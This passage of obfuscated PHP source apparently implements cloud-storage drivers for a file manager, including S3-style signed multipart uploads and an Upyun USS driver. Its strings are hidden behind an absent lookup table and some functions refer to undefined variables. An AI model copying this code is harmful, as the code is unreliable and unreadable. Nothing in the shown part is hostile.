$Õ“¹†Ò[1338] => $Œ ³ì†, $Õ“¹†Ò[1375] => $á»›€¾ƒ, $Õ“¹†Ò[1376] => $Ø£µ˜Í¶, $Õ“¹†Ò[1377] => $¾÷èÖ¤ï, $Õ“¹†Ò[1378] => $”ñêô¬‡, $Õ“¹†Ò[1379] => $Ôã‘İ§Í, $Õ“¹†Ò[181] => $this->getHost()); return $„ñŸ«äÅ; } public function multiUploadFormData($–çºŸ˜, $ˆ“Ì²Ì  = 3600) { $ŞãƒŞ§× =& $_SERVER[óó‹¸‚å]; $¬é§®İª = gmdate($ŞãƒŞ§×[1460]); $õ·†·×¼ = array(); $ü˜×è¢ë = $this->client->getUploadId($this->bucket, $–çºŸ˜, $õ·†·×¼); if (!$ü˜×è¢ë) { return !1; } return array($ŞãƒŞ§×[223] => $ü˜×è¢ë, $ŞãƒŞ§×[181] => $this->getHost() . $ŞãƒŞ§×[8] . $this->pathEncode($–çºŸ˜), $ŞãƒŞ§×[224] => $¬é§®İª, $ŞãƒŞ§×[94] => $–çºŸ˜); } public function multiUploadAuthData($ïĞ–ãüì, $Ô‚ÏŠ™ı = array()) { $Ô‚¿÷şè =& $_SERVER[óó‹¸‚å]; $ŸÒ¼œƒ = isset($Ô‚ÏŠ™ı[$Ô‚¿÷şè[174]]) ? $Ô‚ÏŠ™ı[$Ô‚¿÷şè[174]] : $Ô‚¿÷şè[12]; $í‰û½‘³ = $Ô‚ÏŠ™ı[$Ô‚¿÷şè[94]]; unset($Ô‚ÏŠ™ı[$Ô‚¿÷şè[94]]); if (isset($Ô‚ÏŠ™ı[$Ô‚¿÷şè[225]])) { return $this->listUploadParts($í‰û½‘³, $Ô‚ÏŠ™ı); } $Øé•‘·Ã = array(); if (isset($Ô‚ÏŠ™ı[$Ô‚¿÷şè[1461]])) { $Øé•‘·Ã[$Ô‚¿÷şè[1462]] = $Ô‚ÏŠ™ı[$Ô‚¿÷şè[1461]]; } $ĞÕš‘Ç¬ = explode($Ô‚¿÷şè[183], $this->getHost()); $ñ¡Œ® = array($Ô‚¿÷şè[1463] => $ĞÕš‘Ç¬[1], $Ô‚¿÷şè[1464] => $Ô‚¿÷şè[12], $Ô‚¿÷şè[215] => $Ô‚¿÷şè[120], $Ô‚¿÷şè[1374] => $Ô‚ÏŠ™ı[$Ô‚¿÷şè[76]]); $äî€Á…¢ = $Ô‚¿÷şè[228]; $Ğ÷Ç© = $Ô‚¿÷şè[8] . $this->pathEncode($í‰û½‘³) . $ŸÒ¼œƒ; $ŠÜÉàŠ— = $this->client->__getSignatureV4($Øé•‘·Ã, $ñ¡Œ®, $äî€Á…¢, $Ğ÷Ç©); if (strpos($ŸÒ¼œƒ, $Ô‚¿÷şè[227]) === 0) { if (isset($Øé•‘·Ã[$Ô‚¿÷şè[1462]])) { $†¯ò·Ÿö = $Øé•‘·Ã[$Ô‚¿÷şè[1462]]; } else { if (isset($ŠÜÉàŠ—[$Ô‚¿÷şè[1462]])) { $†¯ò·Ÿö = $ŠÜÉàŠ—[$Ô‚¿÷şè[1462]]; } else { $†¯ò·Ÿö = hash($Ô‚¿÷şè[1372], $Ô‚¿÷şè[12]); } } return array($Ô‚¿÷şè[234] => $ŠÜÉàŠ—[$Ô‚¿÷şè[234]], $Ô‚¿÷şè[1462] => $†¯ò·Ÿö, $Ô‚¿÷şè[224] => $ŠÜÉàŠ—[$Ô‚¿÷şè[1465]]); } return $ŠÜÉàŠ—[$Ô‚¿÷şè[234]]; } public function listUploadParts($ÂåÆŠ¥®, $³ûªóÀã = array()) { $ ·ß›Ê =& $_SERVER[óó‹¸‚å]; $ÃÕ«ìéí = str_replace($ ·ß›Ê[235], $ ·ß›Ê[12], $³ûªóÀã[$ ·ß›Ê[174]]); $Ãƒƒ£è = $this->client->listParts($this->bucket, $ÂåÆŠ¥®, $ÃÕ«ìéí); if (!$Ãƒƒ£è) { return !1; } $ô¾±½‰È = $ ·ß›Ê[1466]; foreach ($Ãƒƒ£è as $€ºëˆ™–) { $ô¾±½‰È .= $ ·ß›Ê[1467] . "\74\x50\x61\162\164\116\x75\155\142\145\x72\76{$€ºëˆ™–[$ ·ß›Ê[1421]]}\x3c\x2f\120\141\162\164\x4e\x75\x6d\x62\x65\162\x3e\12" . "\x3c\105\x54\141\147\x3e{$€ºëˆ™–[$ ·ß›Ê[1422]]}\x3c\x2f\105\x54\x61\147\x3e\12" . $ ·ß›Ê[1468]; } $ô¾±½‰È .= $ ·ß›Ê[1469]; $Å×Ù¼éÙ = array(); $û¶äÆ‰‚ = explode($ ·ß›Ê[183], $this->getHost()); $¯Ôø’É¦ = array($ ·ß›Ê[1463] => $û¶äÆ‰‚[1], $ ·ß›Ê[215] => $ ·ß›Ê[120], $ ·ß›Ê[1374] => strlen($ô¾±½‰È)); $ÀöÊèÉ« = $ ·ß›Ê[226]; $Åö›« = $ ·ß›Ê[8] . $this->pathEncode($ÂåÆŠ¥®) . $³ûªóÀã[$ ·ß›Ê[174]]; $çÎº”„ˆ = $this->client->__getSignatureV4($Å×Ù¼éÙ, $¯Ôø’É¦, $ÀöÊèÉ«, $Åö›«, $ô¾±½‰È); return array($ ·ß›Ê[234] => $çÎº”„ˆ[$ ·ß›Ê[234]], $ ·ß›Ê[224] => $çÎº”„ˆ[$ ·ß›Ê[1465]], $ ·ß›Ê[236] => $Ãƒƒ£è, $ ·ß›Ê[1462] => $çÎº”„ˆ[$ ·ß›Ê[1462]]); } public function link($ÛÇàÀü±, $ÇÁ·ÉŒ¯ = array()) { return parent::link($ÛÇàÀü±, $ÇÁ·ÉŒ¯); } public function fileOut($ˆŞÀÕË, $“öš²¾Ô = false, $®Ñ´Ö–š = false, $ĞÕ³»ã£ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[óó‹¸‚å][1470])) { return parent::fileOutServer($ˆŞÀÕË, $“öš²¾Ô, $®Ñ´Ö–š, $ĞÕ³»ã£); } parent::fileOut($ˆŞÀÕË, $“öš²¾Ô, $®Ñ´Ö–š, $ĞÕ³»ã£); } public function fileOutImage($ÚÊäéƒ, $²ƒ“÷øÙ = 250) { if (strstr($this->endpoint, $_SERVER[óó‹¸‚å][1470])) { return parent::fileOutImageServer($ÚÊäéƒ, $²ƒ“÷øÙ); } parent::fileOutImage($ÚÊäéƒ, $²ƒ“÷øÙ); } public function fileOutLink($ş£Öß›) { $Èë¹†õù =& $_SERVER[óó‹¸‚å]; if (substr($ş£Öß›, 0, 7) == $Èë¹†õù[1341]) { $ş£Öß› = $Èë¹†õù[1342] . substr($ş£Öß›, 7); } header($Èë¹†õù[161] . $ş£Öß›); die; } public function getHost() { $½™„äö” =& $_SERVER[óó‹¸‚å]; $°˜ÃšÊæ = str_rtrim(parent::getHost(), $½™„äö”[8] . $this->bucket); $°˜ÃšÊæ = explode($½™„äö”[183], $°˜ÃšÊæ); return $°˜ÃšÊæ[0] . $½™„äö”[183] . $this->bucket . $½™„äö”[10] . $°˜ÃšÊæ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($İâ„íòÛ, $óØÊŒù  = 0) { parent::__construct(); $this->source = $İâ„íòÛ; $this->sourceSize = $óØÊŒù ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($©¯Å–Æ¶ = false) { return $this->sourceSize; } public function getContent($úÂ€ƒÍı = false) { return $this->fileSubstr($úÂ€ƒÍı, 0, $this->sourceSize); } public function fileSubstr($İà®õÒË = false, $™÷¦Äº = 0, $üù§µš¹ = 0) { if (!$üù§µš¹) { $üù§µš¹ = $this->sourceSize; } $Õ©§¦×ë = $this->sourceSize - $™÷¦Äº; if ($üù§µš¹ >= $Õ©§¦×ë) { $üù§µš¹ = $Õ©§¦×ë; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $™÷¦Äº, $üù§µš¹); } if ($this->sourceType == self::TYPE_FILE) { if ($üù§µš¹ <= 0) { return $_SERVER[óó‹¸‚å][12]; } $­áâùáĞ = ftell($this->source); fseek_64($this->source, $­áâùáĞ + $™÷¦Äº); $—ñ¹«à = @fread($this->source, $üù§µš¹); fseek_64($this->source, $­áâùáĞ); return $—ñ¹«à; } } public function hashMd5($ã£Ó›Ù  = false) { return md5($this->getContent()); } public static function hash($°¹éæ•ë, $Áï«ÇÎå = 0) { $¸Ö¿ÄíÚ = new PathDriverStream($°¹éæ•ë, $Áï«ÇÎå); return $¸Ö¿ÄíÚ->hashSimple($°¹éæ•ë); } public static function md5($âÚø¢—é, $©„¥È©Š = 0) { $ßş¬Œ†ß = new PathDriverStream($âÚø¢—é, $©„¥È©Š); return $ßş¬Œ†ß->hashMd5($âÚø¢—é); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\57\x76\x30\x2e\x61\160\x69\56\165\x70\x79\165\x6e\x2e\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($˜¸ŒüòŒ) { parent::__construct(); $this->_init($˜¸ŒüòŒ); } public function _init($Ë¿¿¢ñƒ) { $¹Üó–´ =& $_SERVER[óó‹¸‚å]; foreach ($Ë¿¿¢ñƒ as $ªîô†û => $ç¢ ì×ï) { if (isset($this->{$ªîô†û})) { $this->{$ªîô†û} = $ç¢ ì×ï; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($¹Üó–´[1471] . LNG($¹Üó–´[1402])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¡¢‚»Òæ, $î¯ö— = "\107\x45\x54") { $¡¯ÉÛÈ =& $_SERVER[óó‹¸‚å]; $ò½•Ì = gmdate($¡¯ÉÛÈ[1435]); $±–ş„³Í = base64_encode(hash_hmac($¡¯ÉÛÈ[1472], "{$î¯ö—}\x26{$¡¢‚»Òæ}\46{$ò½•Ì}", md5("{$this->userpass}"), !0)); $‘³ş¿¥ = array("\101\165\164\x68\157\162\151\172\x61\x74\x69\157\156\72\x55\120\x59\125\x4e\40{$this->username}\x3a{$±–ş„³Í}", "\104\x61\164\x65\x3a{$ò½•Ì}"); return $‘³ş¿¥; } public function ussRequest($¨œ‹²”ù, $ÑáŞŒè = "\107\105\x54", $ƒÕ…ÁÜ± = false, $šääœ•™ = false, $ß÷ú¼şç = false) { $ÂÄ†…ê´ =& $_SERVER[óó‹¸‚å]; $¨œ‹²”ù = trim($¨œ‹²”ù, $ÂÄ†…ê´[8]); $ıß»•ì¨ = "\57{$this->bucket}\x2f{$¨œ‹²”ù}"; $ÂÆŠÊ©» = $this->ussHeaders($ıß»•ì¨, $ÑáŞŒè); if ($šääœ•™) { $ÂÆŠÊ©» = array_merge($ÂÆŠÊ©», $šääœ•™); } $ıË£üŸ = url_request($this->endpoint . $ıß»•ì¨, $ÑáŞŒè, $ƒÕ…ÁÜ±, $ÂÆŠÊ©», $ß÷ú¼şç); if (!$ıË£üŸ) { return array($ÂÄ†…ê´[1220] => !1, $ÂÄ†…ê´[1210] => $ÂÄ†…ê´[1473]); } if (strtolower($ÑáŞŒè) == $ÂÄ†…ê´[196] || in_array($ıË£üŸ[$ÂÄ†…ê´[1220]], array($ÂÄ†…ê´[1326], $ÂÄ†…ê´[1474]))) { $ƒÕ…ÁÜ± = $ıË£üŸ[$ÂÄ†…ê´[1475]]; } else { $ƒÕ…ÁÜ± = json_decode($ıË£üŸ[$ÂÄ†…ê´[1210]], !0); if (!$ƒÕ…ÁÜ±) { $ƒÕ…ÁÜ± = $ıË£üŸ[$ÂÄ†…ê´[1210]]; } else { if (!$ıË£üŸ[$ÂÄ†…ê´[754]] && isset($ƒÕ…ÁÜ±[$ÂÄ†…ê´[1476]])) { $ƒÕ…ÁÜ± = $ƒÕ…ÁÜ±[$ÂÄ†…ê´[1476]]; } } } return array($ÂÄ†…ê´[1220] => $ıË£üŸ[$ÂÄ†…ê´[754]], $ÂÄ†…ê´[1210] => $ƒÕ…ÁÜ±); } public function mkfile($ÊÔÊØÏÄ, $ÂÁã‡„ = '', $Ó»³’ø± = REPEAT_RENAME) { if ($this->setContent($ÊÔÊØÏÄ, $ÂÁã‡„)) { return $this->getPathOuter($ÊÔÊØÏÄ); } return !1; } public function mkdir($‚”Æëğ , $õô•ÚÀ« = REPEAT_SKIP) { $¾ÑÕŒöú =& $_SERVER[óó‹¸‚å]; $°£Áî = trim($‚”Æëğ , $¾ÑÕŒöú[8]); if ($this->_isFolder($°£Áî)) { return $this->getPathOuter($°£Áî); } $šÅÓ°Ïß = array($¾ÑÕŒöú[1477]); $³çõª²Ş = $this->ussRequest($°£Áî, $¾ÑÕŒöú[226], !1, $šÅÓ°Ïß); return $³çõª²Ş[$¾ÑÕŒöú[1220]] ? $this->getPathOuter($°£Áî) : !1; } public function copyFile($ƒ®Ñ·Æ”, $˜”©Øê­) { $Å—™úÒÒ =& $_SERVER[óó‹¸‚å]; $â ³áÏª = array($Å—™úÒÒ[1478] . "\x2f{$this->bucket}\x2f{$ƒ®Ñ·Æ”}", $Å—™úÒÒ[1479]); $ò÷½ı˜¾ = $this->ussRequest($˜”©Øê­, $Å—™úÒÒ[228], !1, $â ³áÏª); return $ò÷½ı˜¾[$Å—™úÒÒ[1220]] ? !0 : $this->getPathOuter($˜”©Øê­); } public function moveFile($‡×óşí, $ÖšòÚîö) { $ÏéüãŠ =& $_SERVER[óó‹¸‚å]; $¯÷Ä×äï = array($ÏéüãŠ[1480] . "\57{$this->bucket}\x2f{$‡×óşí}", $ÏéüãŠ[1479]); $ÏÄÑËËù = $this->ussRequest($ÖšòÚîö, $ÏéüãŠ[228], !1, $¯÷Ä×äï); return $ÏÄÑËËù[$ÏéüãŠ[1220]] ? !0 : $this->getPathOuter($ÖšòÚîö); } public function delFile($ç³„ó›) { $½¸È–ôˆ =& $_SERVER[óó‹¸‚å]; $ñ“¦¯Ô = $this->ussRequest($ç³„ó›, $½¸È–ôˆ[1481]); return $ñ“¦¯Ô[$½¸È–ôˆ[1220]] ? !0 : !1; } public function delFolder($Ğ ¡¹íû) { $–Æ¹ƒ™ª =& $_SERVER[óó‹¸‚å]; if (!$this->exist($Ğ ¡¹íû)) { return !0; } $this->listItemCache = !1; $È˜âõÓÀ = $¢ş÷ı¹ = array(); $this->fileList($Ğ ¡¹íû, $È˜âõÓÀ, $¢ş÷ı¹, !0); $this->listItemCache = !0; foreach ($¢ş÷ı¹ as $¥ÖÚĞÍ) { $»öîóœº = $this->ussRequest($¥ÖÚĞÍ[$–Æ¹ƒ™ª[32]], $–Æ¹ƒ™ª[1481]); if (!$»öîóœº[$–Æ¹ƒ™ª[1220]]) { return !1; } } foreach ($È˜âõÓÀ as $ ´ş€Ï) { $»öîóœº = $this->ussRequest($ ´ş€Ï, $–Æ¹ƒ™ª[1481]); if (!$»öîóœº[$–Æ¹ƒ™ª[1220]]) { return !1; } } $»öîóœº = $this->ussRequest($Ğ ¡¹íû, $–Æ¹ƒ™ª[1481]); return $»öîóœº[$–Æ¹ƒ™ª[1220]]; } public function rename($’Óã†ğ, $›à¦ÑëÙ) { if ($this->isFile($’Óã†ğ)) { $›à¦ÑëÙ = get_path_father($’Óã†ğ) . $›à¦ÑëÙ; return $this->moveFile($’Óã†ğ, $›à¦ÑëÙ); } return $this->renameObject($’Óã†ğ, $›à¦ÑëÙ); } public function fileInfo($·ƒÀ¯, $àÉ±ÉÊ = false, $Ÿ†äÛÊÇ = array()) { $¹´ŠßÜ =& $_SERVER[óó‹¸‚å]; $õ—Úê = array($¹´ŠßÜ[32] => $this->pathThis($·ƒÀ¯), $¹´ŠßÜ[84] => $this->getPathOuter($¹´ŠßÜ[8] . $·ƒÀ¯), $¹´ŠßÜ[33] => $¹´ŠßÜ[199], $¹´ŠßÜ[76] => isset($Ÿ†äÛÊÇ[$¹´ŠßÜ[76]]) ? $Ÿ†äÛÊÇ[$¹´ŠßÜ[76]] : 0, $¹´ŠßÜ[174] => $this->ext($·ƒÀ¯)); if ($àÉ±ÉÊ) { return $õ—Úê; } $õ—Úê[$¹´ŠßÜ[200]] = $õ—Úê[$¹´ŠßÜ[85]] = 0; $õ—Úê[$¹´ŠßÜ[201]] = $õ—Úê[$¹´ŠßÜ[202]] = !0; if (empty($Ÿ†äÛÊÇ)) { $Ÿ†äÛÊÇ = $this->objectMeta($·ƒÀ¯); if (!$Ÿ†äÛÊÇ) { return $õ—Úê; } } $õ—Úê[$¹´ŠßÜ[200]] = intval($Ÿ†äÛÊÇ[$¹´ŠßÜ[1482]]); $õ—Úê[$¹´ŠßÜ[85]] = intval($Ÿ†äÛÊÇ[$¹´ŠßÜ[1483]]); $õ—Úê[$¹´ŠßÜ[76]] = $Ÿ†äÛÊÇ[$¹´ŠßÜ[76]]; return $õ—Úê; } public function folderInfo($¬ÑÑ®˜», $µ™ğĞ¤ğ = false) { $Ôåä°½ =& $_SERVER[óó‹¸‚å]; $‰´½õ¬Ê = array($Ôåä°½[32] => $this->pathThis($¬ÑÑ®˜»), $Ôåä°½[84] => $this->getPathOuter($Ôåä°½[8] . $¬ÑÑ®˜»), $Ôåä°½[33] => $Ôåä°½[75]); if ($µ™ğĞ¤ğ) { return $‰´½õ¬Ê; } $‰´½õ¬Ê[$Ôåä°½[200]] = $‰´½õ¬Ê[$Ôåä°½[85]] = 0; $‰´½õ¬Ê[$Ôåä°½[201]] = $‰´½õ¬Ê[$Ôåä°½[202]] = !0; if (empty($™„ˆ™‘É)) { $™„ˆ™‘É = $this->objectMeta($¬ÑÑ®˜»); if (!$™„ˆ™‘É) { return $‰´½õ¬Ê; } } $‰´½õ¬Ê[$Ôåä°½[200]] = intval($™„ˆ™‘É[$Ôåä°½[1482]]); $‰´½õ¬Ê[$Ôåä°½[85]] = intval($™„ˆ™‘É[$Ôåä°½[1483]]); return $‰´½õ¬Ê; } private function listObjs($í‘¹¤²ü, $ø¸ïâ¢¤ = 0, $ˆÑ´‘˜¶ = 1000) { $å†›õİ² =& $_SERVER[óó‹¸‚å]; $ä“ú¸Ô = array($å†›õİ²[1484], $å†›õİ²[1485] . $ˆÑ´‘˜¶); if ($ø¸ïâ¢¤) { $ä“ú¸Ô[] = $å†›õİ²[1486] . $ø¸ïâ¢¤; } $š™öü²± = $this->ussRequest($í‘¹¤²ü, $å†›õİ²[230], !1, $ä“ú¸Ô); return !$š™öü²±[$å†›õİ²[1220]] ? !1 : $š™öü²±[$å†›õİ²[1210]]; } private function fileList($ôÛÚ¸ŞÊ, &$éáÒ­Ã, &$íÇ¼ãÅÌ, $§­ƒ©Ø = false) { $ÙîÙ¢ä =& $_SERVER[óó‹¸‚å]; $€Ëé„šÄ = $ÙîÙ¢ä[12]; $·ìä¼ª– = 1000; $¸©Ò‘Œ“ = rtrim($ôÛÚ¸ŞÊ, $ÙîÙ¢ä[8]) . $ÙîÙ¢ä[8]; while (!0) { check_abort(); $óªÂÍ¶ = $this->listObjs($ôÛÚ¸ŞÊ, $€Ëé„šÄ, $·ìä¼ª–); if (!$óªÂÍ¶) { return !1; } $€Ëé„šÄ = isset($óªÂÍ¶[$ÙîÙ¢ä[1487]]) ? $óªÂÍ¶[$ÙîÙ¢ä[1487]] : $ÙîÙ¢ä[12]; $ªˆàÅÂ = isset($óªÂÍ¶[$ÙîÙ¢ä[1488]]) ? $óªÂÍ¶[$ÙîÙ¢ä[1488]] : array(); foreach ($ªˆàÅÂ as $Ó·²º¸) { $òÔ¦ç¦ã = $Ó·²º¸[$ÙîÙ¢ä[33]] == $ÙîÙ¢ä[75] ? !0 : !1; $–Èî÷÷÷ = ltrim($¸©Ò‘Œ“ . $Ó·²º¸[$ÙîÙ¢ä[32]], $ÙîÙ¢ä[8]) . ($òÔ¦ç¦ã ? $ÙîÙ¢ä[8] : $ÙîÙ¢ä[12]); $´Âï³£Š = array($ÙîÙ¢ä[32] => $–Èî÷÷÷, $ÙîÙ¢ä[33] => $òÔ¦ç¦ã ? $ÙîÙ¢ä[75] : $ÙîÙ¢ä[199], $ÙîÙ¢ä[76] => $Ó·²º¸[$ÙîÙ¢ä[337]], $ÙîÙ¢ä[1483] => $Ó·²º¸[$ÙîÙ¢ä[1489]]); $this->cacheMethodInfoSet($–Èî÷÷÷, $òÔ¦ç¦ã, $´Âï³£Š); if ($òÔ¦ç¦ã) { $éáÒ­Ã[] = $–Èî÷÷÷; if ($§­ƒ©Ø) { $this->fileList($–Èî÷÷÷, $éáÒ­Ã, $íÇ¼ãÅÌ, $§­ƒ©Ø); } continue; } $íÇ¼ãÅÌ[] = $´Âï³£Š; } if (count($ªˆàÅÂ) < $·ìä¼ª–) { break; } } $this->cacheMethodInfoSet($ôÛÚ¸ŞÊ, !0); } public function listPath($æÁ·´€¯, $Ë¾ÙÌ€À = false) { $Ô‹ºŠè´ =& $_SERVER[óó‹¸‚å]; $ëÎÅÎ‚˜ = $‘¬ë³øú = array(); $this->fileList($æÁ·´€¯, $ëÎÅÎ‚˜, $‘¬ë³øú); foreach ($ëÎÅÎ‚˜ as $ñ‚´û¦” => $€Ì°À‰ğ) { $ëÎÅÎ‚˜[$ñ‚´û¦”] = $this->folderInfo($€Ì°À‰ğ, $Ë¾ÙÌ€À); } foreach ($‘¬ë³øú as $ñ‚´û¦” => $€Ì°À‰ğ) { $‘¬ë³øú[$ñ‚´û¦”] = $this->fileInfo($€Ì°À‰ğ[$Ô‹ºŠè´[32]], $Ë¾ÙÌ€À, $€Ì°À‰ğ); } return array($Ô‹ºŠè´[82] => $ëÎÅÎ‚˜, $Ô‹ºŠè´[83] => $‘¬ë³øú); } public function has($¹É—–â£, $âò›ÌŸƒ = false, $“—“Çê… = true) { $€ü¬‚˜ =& $_SERVER[óó‹¸‚å]; $ó¦­¹À¯ = $€ü¬‚˜[12]; $‘æ‡“÷€ = 500; $—Ğ«¿Ç‡ = 0; $¥ÉÚÑ§ë = 0; $š½”ãç = rtrim($¹É—–â£, $€ü¬‚˜[8]) . $€ü¬‚˜[8]; while (!0) { check_abort(); $ĞŒÕ¸Ô¦ = $this->listObjs($¹É—–â£, $ó¦­¹À¯, $‘æ‡“÷€); if (!$ĞŒÕ¸Ô¦) { return !1; } $ó¦­¹À¯ = isset($ĞŒÕ¸Ô¦[$€ü¬‚˜[1487]]) ? $ĞŒÕ¸Ô¦[$€ü¬‚˜[1487]] : $€ü¬‚˜[12]; $µÚ—ÜËã = isset($ĞŒÕ¸Ô¦[$€ü¬‚˜[1488]]) ? $ĞŒÕ¸Ô¦[$€ü¬‚˜[1488]] : array(); if (empty($µÚ—ÜËã)) { break; } $®°éœÖ‹ = array_filter($µÚ—ÜËã, function ($õúì¡³Ú) { $Ûš—‘ÆÊ =& $_SERVER[óó‹¸‚å]; return $õúì¡³Ú[$Ûš—‘ÆÊ[33]] == $Ûš—‘ÆÊ[75]; }); $¯—î‘Ä = count($µÚ—ÜËã); $®°éœÖ‹ = count($®°éœÖ‹); $ï’¨ı„ = $¯—î‘Ä - $®°éœÖ‹; if ($âò›ÌŸƒ) { $¥ÉÚÑ§ë += $®°éœÖ‹; $—Ğ«¿Ç‡ += $ï’¨ı„; if ($¯—î‘Ä < $‘æ‡“÷€) { break; } continue; } if ($“—“Çê…) { if ($ï’¨ı„) { return !0; } } else { if ($®°éœÖ‹) { return !0; } } if ($¯—î‘Ä < $‘æ‡“÷€) { break; } } if ($âò›ÌŸƒ) { return array($€ü¬‚˜[207] => $—Ğ«¿Ç‡, $€ü¬‚˜[208] => $¥ÉÚÑ§ë); } return !1; } public function listAll($‡ğ÷ŒÔ) { $ã¼ö´ù =& $_SERVER[óó‹¸‚å]; $›‹Ï­‘‘ = $ÄòˆÆš¶ = array(); $this->fileList($‡ğ÷ŒÔ, $›‹Ï­‘‘, $ÄòˆÆš¶, !0); $È¸Öµá¸ = array(); foreach ($ÄòˆÆš¶ as $“Û¬©•Õ) { $È¸Öµá¸[$“Û¬©•Õ[$ã¼ö´ù[32]]] = $“Û¬©•Õ[$ã¼ö´ù[76]]; } foreach ($›‹Ï­‘‘ as $“Û¬©•Õ) { if (is_string($“Û¬©•Õ)) { $È¸Öµá¸[$“Û¬©•Õ] = 0; } } return $this->listAllFiles($‡ğ÷ŒÔ, array_keys($È¸Öµá¸), $È¸Öµá¸); } public function canRead($Ş¹ò³‘î) { return $this->exist($Ş¹ò³‘î) ? !0 : !1; } public function canWrite($ì¢„£æù) { return $this->exist($ì¢„£æù) ? !0 : !1; } public function getContent($äÓ„¢ñ˜) { return $this->fileSubstr($äÓ„¢ñ˜, 0, -1); } public function setContent($£îŸ×™À, $Â ªÄ = '') { $à÷Ç™óÁ =& $_SERVER[óó‹¸‚å]; if (!$Â ªÄ) { $­Ê°âÌ° = $this->ussRequest($£îŸ×™À, $à÷Ç™óÁ[226]); return $­Ê°âÌ°[$à÷Ç™óÁ[1220]]; } $—‡Ş—Ş = $this->tempFile($this->pathThis($£îŸ×™À)); file_put_contents($—‡Ş—Ş, $Â ªÄ); if ($this->upload($£îŸ×™À, $—‡Ş—Ş)) { $this->tempFileRemve($—‡Ş—Ş); return !0; } return !1; } public function fileSubstr($æ¶¼¢ƒ£, $©´¯‰¿½, $Ë¢ıáƒå) { $õŒ‡ı« =& $_SERVER[óó‹¸‚å]; if (!($ê¨‘ïÒ = $this->link($æ¶¼¢ƒ£))) { return !1; } $ƒ»Ñ°òà = !1; if ($Ë¢ıáƒå > 0) { $¢˜ØşÏ’ = $©´¯‰¿½ + $Ë¢ıáƒå - 1; $ƒ»Ñ°òà = array($õŒ‡ı«[1450] . $©´¯‰¿½ . $õŒ‡ı«[386] . $¢˜ØşÏ’); } $…œ¤Êíü = url_request($ê¨‘ïÒ, $õŒ‡ı«[230], !1, $ƒ»Ñ°òà); return $…œ¤Êíü[$õŒ‡ı«[754]] ? $…œ¤Êíü[$õŒ‡ı«[1210]] : !1; } public function upload($Ë×ø¨´, $»ğş©ğµ, $™¾Š‡ = false, $¸ Ñº³ = REPEAT_REPLACE) { $—§Ñö†¹ =& $_SERVER[óó‹¸‚å]; $Î„Ğ˜†ó = IO::size($»ğş©ğµ); if ($Î„Ğ˜†ó <= 1024 * 1024 * 200) { $·¥Ô´¦Ÿ = array($—§Ñö†¹[1490] . $»ğş©ğµ); $â¦¿£Ñˆ = $this->ussRequest($Ë×ø¨´, $—§Ñö†¹[228], $·¥Ô´¦Ÿ); return $â¦¿£Ñˆ[$—§Ñö†¹[1220]] ? $this->getPathOuter($Ë×ø¨´) : !1; } $“íÌ¢ˆë = 1024 * 1024 * 10; $ÙüëÆä = array($—§Ñö†¹[1491], $—§Ñö†¹[1492] . $Î„Ğ˜†ó, $—§Ñö†¹[1493], $—§Ñö†¹[1494] . $“íÌ¢ˆë); $â¦¿£Ñˆ = $this->ussRequest($Ë×ø¨´, $—§Ñö†¹[228], !1, $ÙüëÆä); if (!$â¦¿£Ñˆ[$—§Ñö†¹[1220]]) { return !1; } $™Ç€İÉè = $â¦¿£Ñˆ[$—§Ñö†¹[1210]]; $À¨€£Í = 0; $¯Åø»¦ = $™Ç€İÉè[$—§Ñö†¹[1495]]; $Ğ·¤›íæ = fopen($»ğş©ğµ, $—§Ñö†¹[1398]); if (!$Ğ·¤›íæ) { return !1; } do { $ï¹ßºïş = $™Ç€İÉè[$—§Ñö†¹[1496]]; fseek_64($Ğ·¤›íæ, $À¨€£Í); $ë”ª²ú‹ = fread($Ğ·¤›íæ, $ï¹ßºïş); $êÈĞÍ¯Û = 0; do { $êÈĞÍ¯Û++; $™Ç€İÉè = $this->uploadPart($Ë×ø¨´, $™Ç€İÉè, $ë”ª²ú‹); } while (!$™Ç€İÉè && $êÈĞÍ¯Û < 3); if (!$™Ç€İÉè) { return !1; } $¯Åø»¦ = $™Ç€İÉè[$—§Ñö†¹[1495]]; $À¨€£Í += $ï¹ßºïş; } while ($¯Åø»¦ != -1); fclose($Ğ·¤›íæ); $ÙüëÆä = array($—§Ñö†¹[1497], $—§Ñö†¹[1498] . $™Ç€İÉè[$—§Ñö†¹[1499]], $—§Ñö†¹[1493]); $â¦¿£Ñˆ = $this->ussRequest($Ë×ø¨´, $—§Ñö†¹[228], !1, $ÙüëÆä); return $â¦¿£Ñˆ[$—§Ñö†¹[1220]] ? $this->getPathOuter($œ°µ¢—ê) : !1; } private function uploadPart($ØÓ·Û–, $æ™Â¨Ç´, &$‘ğ›á´) { $ Á½¶í =& $_SERVER[óó‹¸‚å]; $éƒ¼’ÃÎ = array($ Á½¶í[1500], $ Á½¶í[1498] . $æ™Â¨Ç´[$ Á½¶í[1499]], $ Á½¶í[1501] . $æ™Â¨Ç´[$ Á½¶í[1495]], $ Á½¶í[142] . $æ™Â¨Ç´[$ Á½¶í[1496]]); $ÁÖÚé = $this->ussRequest($ØÓ·Û–, $ Á½¶í[228], $‘ğ›á´, $éƒ¼’ÃÎ); return !$ÁÖÚé[$ Á½¶í[1220]] ? $ÁÖÚé[$ Á½¶í[1220]] : $ÁÖÚé[$ Á½¶í[1210]]; } public function uploadFormData($œ©‘ßè, $ÓúŠî™ = 3600) { return $this->uploadPolicy($œ©‘ßè, $ÓúŠî™); } public function multiUploadFormData($ÖÊ»©ÇÇ, $„©øĞ˜¸ = 3600) { $âÂ³±ª =& $_SERVER[óó‹¸‚å]; $½×¯ÅÃĞ = (int) $GLOBALS[$âÂ³±ª[7]][$âÂ³±ª[76]]; return $this->uploadPolicy($ÖÊ»©ÇÇ, $„©øĞ˜¸, $½×¯ÅÃĞ); } private function uploadPolicy($ˆÕçªª¶, $›Ø­÷¤Ø = 3600, $‰õÆ¿ã = 0) { 